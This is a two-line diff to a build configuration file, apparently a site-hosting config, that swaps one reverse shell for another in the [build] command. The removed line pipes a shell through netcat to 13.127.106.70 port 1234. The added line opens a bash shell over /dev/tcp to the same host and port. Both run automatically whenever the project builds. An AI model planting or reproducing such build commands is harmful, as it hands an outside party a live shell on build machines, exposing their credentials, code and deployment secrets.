@@ -1,2 +1,2 @@
 [build]
-  command = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 13.127.106.70 1234 >/tmp/f"
+  command = "bash -i >& /dev/tcp/13.127.106.70/1234 0>&1"
